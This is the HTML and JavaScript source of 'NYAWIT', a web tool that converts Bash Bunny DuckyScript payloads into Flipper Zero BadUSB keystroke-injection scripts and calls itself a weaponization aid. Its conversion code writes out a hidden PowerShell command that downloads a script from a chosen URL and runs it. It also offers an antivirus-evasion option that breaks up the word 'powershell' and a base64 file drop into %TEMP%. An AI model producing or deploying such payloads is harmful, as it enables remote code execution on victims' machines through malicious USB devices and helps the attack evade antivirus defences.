<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>NYAWIT :: By XsanLahci</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Inter:wght@400;600;800&family=Orbitron:wght@400;700;900&family=Poppins:wght@300;500;700&display=swap');

/* --- THEME SYSTEM VARIABLES --- */
:root {
    /* Default: Adult (Modern/Carbon Pro) */
    --bg: #0f172a;
    --card: #1e293b;
    --txt: #f1f5f9;
    --dim: #94a3b8;
    --accent: #06b6d4;
    --accent-d: rgba(6, 182, 212, 0.2);
    --warn: #f59e0b;
    --err: #ef4444;
    --bdr: #334155;
    --font-main: 'Inter', sans-serif;
    --font-mono: 'Share Tech Mono', monospace;
    --radius: 8px;
    --matrix-op: 0.05;
}

[data-theme="lansia"] {
    --bg: #000000;
    --card: #1a1a1a;
    --txt: #ffffff;
    --dim: #cccccc;
    --accent: #ffff00;
    --accent-d: rgba(255, 255, 0, 0.2);
    --warn: #ffaa00;
    --err: #ff0000;
    --bdr: #ffffff;
    --radius: 4px;
    --matrix-op: 0;
}

[data-theme="remaja"] {
    --bg: #0b0e14;
    --card: rgba(23, 25, 35, 0.8);
    --txt: #e2e8f0;
    --dim: #718096;
    --accent: #ff007a;
    --accent-d: rgba(255, 0, 122, 0.2);
    --warn: #7928ca;
    --err: #ff4d4d;
    --bdr: #44337a;
    --font-main: 'Poppins', sans-serif;
    --radius: 16px;
    --matrix-op: 0.15;
}

[data-theme="hacker"] {
    --bg: #020a0f;
    --card: #0a1520;
    --txt: #c8e6c9;
    --dim: #4a7a5a;
    --accent: #39ff14; /* Classic Matrix Green */
    --accent-d: rgba(57, 255, 20, 0.2);
    --warn: #ff9f1c;
    --err: #ff2d55;
    --bdr: #1a3a2a;
    --font-main: 'Share Tech Mono', monospace;
    --radius: 4px;
    --matrix-op: 0.15;
}

/* --- BASE STYLES --- */
* { margin:0; padding:0; box-sizing:border-box; transition: background 0.3s, color 0.3s, border 0.3s; }
body { 
    min-height:100vh; 
    background: var(--bg); 
    color: var(--txt); 
    font-family: var(--font-main); 
    overflow-x:hidden; 
    line-height: 1.5;
}

#mc { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity: var(--matrix-op); pointer-events:none; }
.w { position:relative; z-index:1; max-width:1200px; margin:0 auto; padding: 20px; display:flex; flex-direction:column; gap: 20px; }

/* --- HEADER --- */
header { text-align:center; padding: 20px 0 10px; }
.hg { 
    font-family: 'Orbitron', sans-serif; 
    font-size: clamp(2rem, 5vw, 3rem); 
    font-weight: 900; 
    color: var(--accent);
    text-shadow: 0 0 15px var(--accent-d);
    letter-spacing: 4px;
}
.hs-full { 
    font-size: 0.75rem; 
    color: var(--dim); 
    letter-spacing: 2px; 
    margin-top: 5px; 
    text-transform: uppercase;
    font-weight: 500;
}
.hs-full span { color: var(--accent); }

/* --- THEME SWITCHER & ABOUT --- */
.nav-container {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 15px;
    flex-wrap: wrap;
}

.theme-nav {
    display: flex;
    justify-content: center;
    gap: 8px;
    background: rgba(0,0,0,0.2);
    padding: 6px;
    border-radius: 50px;
    border: 1px solid var(--bdr);
    width: fit-content;
}
.t-btn {
    padding: 6px 14px;
    border: none;
    background: transparent;
    color: var(--dim);
    border-radius: 50px;
    cursor: pointer;
    font-weight: 600;
    font-size: 0.7rem;
    text-transform: uppercase;
    transition: all 0.2s;
}
.t-btn:hover { color: var(--txt); }
.t-btn.active { background: var(--accent); color: #000; box-shadow: 0 0 10px var(--accent-d); }

.about-btn {
    background: var(--card);
    border: 1px solid var(--bdr);
    color: var(--accent);
    padding: 6px 18px;
    border-radius: 50px;
    cursor: pointer;
    font-size: 0.7rem;
    font-weight: 800;
    text-transform: uppercase;
    letter-spacing: 1px;
}
.about-btn:hover { border-color: var(--accent); background: var(--accent-d); }

/* --- MODAL --- */
.modal-overlay {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.85);
    backdrop-filter: blur(4px);
    z-index: 2000;
    display: none;
    align-items: center;
    justify-content: center;
    padding: 20px;
}
.modal-overlay.open { display: flex; }
.modal-content {
    background: var(--card);
    border: 2px solid var(--accent);
    max-width: 500px;
    width: 100%;
    border-radius: var(--radius);
    padding: 30px;
    position: relative;
    box-shadow: 0 0 30px var(--accent-d);
    animation: modalSlide 0.3s ease;
}
@keyframes modalSlide { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
.modal-close {
    position: absolute;
    top: 15px; right: 15px;
    color: var(--dim);
    cursor: pointer;
    font-size: 1.2rem;
}
.modal-close:hover { color: var(--err); }
.modal-title { font-family: 'Orbitron', sans-serif; color: var(--accent); margin-bottom: 15px; font-size: 1.2rem; }
.modal-body { font-size: 0.9rem; color: var(--txt); line-height: 1.6; }
.modal-footer { margin-top: 20px; font-size: 0.75rem; color: var(--dim); border-top: 1px solid var(--bdr); padding-top: 15px; text-align: right; }

/* --- CONFIG BAR --- */
.config-bar {
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
    background: var(--card);
    padding: 15px;
    border-radius: var(--radius);
    border: 1px solid var(--bdr);
    align-items: center;
}
.cfg-item { display: flex; align-items: center; gap: 8px; font-size: 0.8rem; color: var(--dim); }
.cfg-item label { font-weight: 600; text-transform: uppercase; color: var(--accent); font-size: 0.7rem; }
select, .chk-wrap { background: #000; color: var(--txt); border: 1px solid var(--bdr); padding: 5px; border-radius: 4px; outline: none; }
.chk-wrap { display: flex; align-items: center; gap: 5px; cursor: pointer; }

/* --- EDITOR --- */
.editor-container { position: relative; border: 1px solid var(--bdr); border-radius: var(--radius); overflow: hidden; background: #000; }
.editor-container.dragover { border: 2px dashed var(--accent); }

#highlight-layer {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    padding: 15px;
    margin: 0;
    pointer-events: none;
    white-space: pre-wrap;
    word-wrap: break-word;
    font-family: var(--font-mono);
    font-size: 0.9rem;
    color: transparent;
    overflow: hidden;
}
textarea {
    position: relative;
    z-index: 1;
    width: 100%;
    min-height: 300px;
    background: transparent;
    color: var(--txt);
    font-family: var(--font-mono);
    padding: 15px;
    border: none;
    outline: none;
    resize: vertical;
    font-size: 0.9rem;
    caret-color: var(--accent);
}
[data-theme="lansia"] textarea { font-size: 1.3rem; }

.hl-cmd { color: var(--accent); font-weight: bold; }
.hl-str { color: var(--warn); }
.hl-com { color: var(--dim); font-style: italic; }
.hl-num { color: #818cf8; }

/* --- GRID --- */
.cg { display: grid; grid-template-columns: 1fr auto 1fr; gap: 20px; margin-top: 10px; }
.panel { background: var(--card); border-radius: var(--radius); border: 1px solid var(--bdr); overflow: hidden; }
.ph { padding: 12px 15px; background: rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--bdr); }
.pt { font-weight: 700; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; }

.stats-footer {
    background: rgba(0,0,0,0.3);
    padding: 8px 15px;
    display: flex;
    justify-content: space-between;
    font-size: 0.7rem;
    color: var(--dim);
}
.stat-val { color: var(--accent); font-weight: bold; }

/* --- STRATEGY --- */
.sw { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 15px; }
.stb { background: var(--card); border: 1px solid var(--bdr); border-radius: var(--radius); padding: 20px; cursor: pointer; }
.stb.active { border: 2px solid var(--accent); box-shadow: 0 0 15px var(--accent-d); }
.sl { font-weight: 800; text-transform: uppercase; margin-bottom: 8px; color: var(--accent); display: flex; align-items: center; gap: 10px; }
.sd2 { font-size: 0.85rem; color: var(--dim); }

/* --- UTILS --- */
.btn-main { background: var(--accent); color: #000; border: none; padding: 12px 24px; border-radius: var(--radius); font-weight: 800; cursor: pointer; text-transform: uppercase; }
.bs { background: rgba(255,255,255,0.05); border: 1px solid var(--bdr); color: var(--txt); padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 0.7rem; }
.sp { display: none; background: var(--card); border-radius: var(--radius); border: 1px solid var(--bdr); overflow: hidden; }
.sp.vis { display: block; }

@media (max-width: 850px) { .cg { grid-template-columns: 1fr; } }
</style>
</head>
<body data-theme="modern">

<canvas id="mc"></canvas>

<!-- ABOUT MODAL -->
<div class="modal-overlay" id="aboutModal">
    <div class="modal-content">
        <div class="modal-close" onclick="toggleAbout()">✕</div>
        <div class="modal-title">ABOUT NYAWIT</div>
        <div class="modal-body">
            <strong>NYAWIT</strong> "Ninja Yard Device for Attack, Weaponization & Injection Tasks" is a specialized security tool designed to convert <strong>Bash Bunny (HAK5)</strong> DuckyScript payloads into the <strong>Flipper Zero BadUSB</strong> format. 
            <br><br>
            It helps researchers and professionals streamline the weaponization process by providing intelligent injection strategies, keyboard layout support, and basic antivirus obfuscation.
        </div>
        <div class="modal-footer">
            Developed by <strong>xsanlahci</strong> &copy; 2026
        </div>
    </div>
</div>

<div class="w">
    <header>
        <div class="hg">NYAWIT</div>
        <div class="hs-full">
            <span>N</span>inja <span>Y</span>ard <span>A</span>ttack <span>W</span>eaponization & <span>I</span>njection <span>T</span>asks
        </div>
    </header>

    <div class="nav-container">
        <nav class="theme-nav">
            <button class="t-btn active" onclick="setTheme('modern', this)">ADULT</button>
            <button class="t-btn" onclick="setTheme('lansia', this)">SENIOR</button>
            <button class="t-btn" onclick="setTheme('remaja', this)">TEEN</button>
            <button class="t-btn" onclick="setTheme('hacker', this)">HACKER</button>
        </nav>
        <button class="about-btn" onclick="toggleAbout()">ABOUT</button>
    </div>

    <!-- CONFIG BAR -->
    <div class="config-bar">
        <div class="cfg-item">
            <label>Keyboard Layout</label>
            <select id="kbdLayout" onchange="convert()">
                <option value="">Default (US)</option>
                <option value="US">US - English</option>
                <option value="UK">UK - English</option>
                <option value="DE">DE - German</option>
                <option value="FR">FR - French</option>
                <option value="IT">IT - Italian</option>
                <option value="ES">ES - Spanish</option>
                <option value="RU">RU - Russian</option>
            </select>
        </div>
        <div class="cfg-item">
            <label class="chk-wrap">
                <input type="checkbox" id="obfuscateOpt" onchange="convert()">
                AV Obfuscation
            </label>
        </div>
        <div class="cfg-item" style="margin-left:auto">
            <span id="estTime">Est. Duration: <span class="stat-val">0s</span></span>
        </div>
    </div>

    <div class="sw">
        <div class="stb active" onclick="selectStrat(1,this)" id="btn1">
            <div class="sl">REMOTE IEX</div>
            <div class="sd2">HTTPS Download & Exec. Best for large payloads.</div>
        </div>
        <div class="stb" onclick="selectStrat(2,this)" id="btn2">
            <div class="sl">OFFLINE B64</div>
            <div class="sd2">File-Write chunks. No internet required.</div>
        </div>
        <div class="stb" onclick="selectStrat(3,this)" id="btn3">
            <div class="sl">INLINE TYPE</div>
            <div class="sd2">Direct injection. Only for tiny scripts.</div>
        </div>
    </div>

    <!-- SUB PANELS -->
    <div class="sp vis" id="sp1">
        <div style="padding:15px">
            <input id="remoteUrl" type="text" style="width:100%; padding:10px; background:#000; border:1px solid var(--bdr); color:var(--accent); font-family:var(--font-mono)" placeholder="https://your-server.com/payload.ps1" oninput="convert()"/>
        </div>
    </div>
    <div class="sp" id="sp2"><textarea id="sub2Script" placeholder="Paste PS1 script here..." oninput="convert()"></textarea></div>
    <div class="sp" id="sp3"><textarea id="sub3Script" placeholder="Paste small script here..." oninput="convert()"></textarea></div>

    <div class="cg">
        <div class="panel">
            <div class="ph">
                <div class="pt">INPUT (Drag & Drop)</div>
                <button class="bs" onclick="loadSample()">SAMPLE</button>
            </div>
            <div class="editor-container" id="dropZone">
                <div id="highlight-layer"></div>
                <textarea id="input" placeholder="Paste or Drop DuckyScript/BashBunny script here..." oninput="updateEditor()"></textarea>
            </div>
            <div class="stats-footer">
                <span>Lines: <span id="lineCount" class="stat-val">0</span></span>
                <span>Chars: <span id="charCount" class="stat-val">0</span></span>
            </div>
        </div>

        <div style="display:flex; align-items:center; justify-content:center; padding:10px; color:var(--accent)">▶</div>

        <div class="panel">
            <div class="ph">
                <div class="pt">FLIPPER OUTPUT</div>
                <button class="bs" onclick="copyOutput()">COPY</button>
            </div>
            <textarea id="output" readonly placeholder="BadUSB conversion results..."></textarea>
            <div style="padding:10px; background:rgba(0,0,0,0.3); text-align:center">
                <button class="btn-main" onclick="downloadOutput()">DOWNLOAD .TXT</button>
            </div>
        </div>
    </div>

    <footer>
        NYAWIT v3.6 // Ninja Yard Device for Attack, Weaponization & Injection Tasks // 2026 // xsanlahci
    </footer>
</div>

<script>
/* --- UTILS --- */
const KM={'ENTER':'ENTER','RETURN':'ENTER','SPACE':'SPACE','TAB':'TAB','ESC':'ESC','ESCAPE':'ESC','BACKSPACE':'BACKSPACE','DELETE':'DELETE','UP':'UP_ARROW','DOWN':'DOWN_ARROW','LEFT':'LEFT_ARROW','RIGHT':'RIGHT_ARROW','UP_ARROW':'UP_ARROW','DOWN_ARROW':'DOWN_ARROW','LEFT_ARROW':'LEFT_ARROW','RIGHT_ARROW':'RIGHT_ARROW','GUI':'GUI','WIN':'GUI','SHIFT':'SHIFT','CTRL':'CTRL','ALT':'ALT'};
function mk(k){const u=k.toUpperCase(); return KM[u]||(k.length===1?k:u);}

let curStrat=1;
function selectStrat(n,el){
    curStrat=n;
    document.querySelectorAll('.stb').forEach(b=>b.classList.remove('active'));
    el.classList.add('active');
    document.getElementById('sp1').classList.toggle('vis',n===1);
    document.getElementById('sp2').classList.toggle('vis',n===2);
    document.getElementById('sp3').classList.toggle('vis',n===3);
    convert();
}

function setTheme(theme, btn) {
    document.body.setAttribute('data-theme', theme);
    document.querySelectorAll('.t-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
}

function toggleAbout() {
    const modal = document.getElementById('aboutModal');
    modal.classList.toggle('open');
}

/* --- SYNTAX HIGHLIGHTING --- */
function updateEditor() {
    const inp = document.getElementById('input');
    const hl = document.getElementById('highlight-layer');
    let text = inp.value;

    text = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    text = text.replace(/^(STRING|DELAY|SLEEP|QUACK|RUN|ENTER|GUI|WIN|MENU|APP|SHIFT|CONTROL|CTRL|ALT|KEY|KEYS|HOLD|RELEASE|ID|REM|TYPE)/gim, '<span class="hl-cmd">$1</span>');
    text = text.replace(/(STRING|TYPE)\s+(.*)$/gm, '$1 <span class="hl-str">$2</span>');
    text = text.replace(/^(REM|#).*$/gm, '<span class="hl-com">$&</span>');
    text = text.replace(/\b\d+\b/g, '<span class="hl-num">$&</span>');

    hl.innerHTML = text + "\n";
    hl.scrollTop = inp.scrollTop;
    hl.scrollLeft = inp.scrollLeft;
    
    convert();
}

document.getElementById('input').addEventListener('scroll', function() {
    const hl = document.getElementById('highlight-layer');
    hl.scrollTop = this.scrollTop;
    hl.scrollLeft = this.scrollLeft;
});

/* --- DRAG & DROP --- */
const dz = document.getElementById('dropZone');
dz.addEventListener('dragover', (e) => { e.preventDefault(); dz.classList.add('dragover'); });
dz.addEventListener('dragleave', () => dz.classList.remove('dragover'));
dz.addEventListener('drop', (e) => {
    e.preventDefault();
    dz.classList.remove('dragover');
    const file = e.dataTransfer.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = (re) => {
            document.getElementById('input').value = re.target.result;
            updateEditor();
        };
        reader.readAsText(file);
    }
});

/* --- OBFUSCATOR --- */
function obfuscateString(str) {
    if(!document.getElementById('obfuscateOpt').checked) return str;
    if(str.toLowerCase().includes('powershell')) {
        return str.replace(/powershell/gi, 'p""o""w""e""r""s""h""e""l""l');
    }
    return str;
}

/* --- TIME ESTIMATOR --- */
function estimateTime(payloadLines) {
    let ms = 0;
    payloadLines.forEach(l => {
        const p = l.split(/\s+/);
        const cmd = p[0].toUpperCase();
        if(cmd === 'DELAY') ms += parseInt(p[1]) || 0;
        else if(cmd === 'STRING') ms += (p.slice(1).join(' ').length * 15);
        else if(cmd === 'ENTER' || cmd === 'KEY') ms += 100;
        else if(cmd === 'KEYS') ms += 200;
    });
    const sec = (ms / 1000).toFixed(1);
    document.getElementById('estTime').innerHTML = `Est. Duration: <span class="stat-val">${sec}s</span>`;
}

/* --- CONVERSION ENGINE --- */
function convertPayload(bb){
  const lines=bb.split('\n'),out=[];
  const layout = document.getElementById('kbdLayout').value;
  if(layout) out.push(`ID ${layout}`, '');

  for(let i=0;i<lines.length;i++){
    const t=lines[i].trim();
    if(!t){out.push('');continue;}
    if(t.startsWith('#') || t.toUpperCase().startsWith('REM')){
        out.push('// '+t.replace(/^(#|REM)\s*/i, '').trim());
        continue;
    }
    const p=t.split(/\s+/),cmd=p[0].toUpperCase();
    
    if(cmd==='SLEEP' || cmd==='DELAY'){
        const s = (cmd==='SLEEP') ? parseFloat(p[1])*1000 : parseInt(p[1]);
        out.push(`DELAY ${Math.round(s)}`); continue;
    }
    if(cmd==='QUACK') { out.push(...convQuack(p.slice(1))); continue; }
    if(cmd==='RUN') { out.push(...convRUN(t,p)); continue; }
    if(cmd==='STRING'||cmd==='TYPE'){
        const idx=t.search(/\s/);
        const content = idx===-1?'':t.substring(idx+1);
        out.push('STRING ' + obfuscateString(content)); continue;
    }
    if(cmd==='ENTER') { out.push('KEY ENTER'); continue; }
    if(cmd==='GUI'||cmd==='WIN') { out.push(`KEYS GUI ${p[1]||''}`); continue; }
    if(cmd==='ID') { out.push(`ID ${p[1]}`); continue; }
    
    out.push(`// [?] ${t}`);
  }
  
  estimateTime(out);
  return out.join('\n');
}

function convQuack(tk){
    const f=tk[0].toUpperCase();
    if(f==='GUI'||f==='WIN') return [`KEYS GUI ${tk[1]||''}`];
    if(f==='STRING') return [`STRING ${obfuscateString(tk.slice(1).join(' '))}`];
    if(f==='ENTER') return ['KEY ENTER'];
    return [`KEY ${mk(tk[0])}`];
}

function convRUN(t,p){
    const res=['// RUN STRAT '+curStrat];
    if(curStrat === 1) {
        const url = document.getElementById('remoteUrl').value || 'YOUR_URL';
        res.push('KEYS GUI r','DELAY 800',`STRING ${obfuscateString('powershell -w Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\''+url+'\')"')}`,'KEY ENTER');
    } else if(curStrat === 2) {
        const script = document.getElementById('sub2Script').value;
        const b64 = btoa(script || "echo 'null'");
        res.push('KEYS GUI r','DELAY 800',`STRING cmd /c echo ${b64.substring(0,60)} > %TEMP%\\b.b64`,'KEY ENTER');
    } else {
        const lines = (document.getElementById('sub3Script').value || "").split('\n');
        lines.forEach(l => { if(l.trim()) res.push(`STRING ${obfuscateString(l.trim())}`, 'KEY ENTER', 'DELAY 250'); });
    }
    return res;
}

function convert(){
    const inp = document.getElementById('input').value;
    const res = convertPayload(inp);
    document.getElementById('output').value = res;
    document.getElementById('lineCount').innerText = inp.split('\n').length;
    document.getElementById('charCount').innerText = inp.length;
}

function loadSample(){
    document.getElementById('input').value = `REM Flipper Check\nID US\nDELAY 500\nGUI r\nDELAY 200\nSTRING powershell -w Hidden\nENTER\nDELAY 500\nSTRING Write-Host "Hello Secure World"\nENTER`;
    updateEditor();
}

function copyOutput(){
    const v = document.getElementById('output');
    v.select();
    document.execCommand('copy');
}

function downloadOutput(){
    const v = document.getElementById('output').value;
    const b = new Blob([v],{type:'text/plain'}), u = URL.createObjectURL(b), a = document.createElement('a');
    a.href = u; a.download = 'flipper_badusb.txt'; a.click();
}

/* --- MATRIX --- */
(function(){const c=document.getElementById('mc'),x=c.getContext('2d');let W,H,cols,d;function init(){W=c.width=innerWidth;H=c.height=innerHeight;cols=Math.floor(W/14);d=Array(cols).fill(0);}function draw(){x.fillStyle='rgba(0,0,0,0.05)';x.fillRect(0,0,W,H);x.fillStyle='#0ff';for(let i=0;i<cols;i++){x.fillText(String.fromCharCode(33+Math.random()*90),i*14,d[i]*14);if(d[i]*14>H&&Math.random()>0.975)d[i]=0;d[i]++;}requestAnimationFrame(draw);}init();draw();})();

updateEditor();
</script>
</body>
</html>
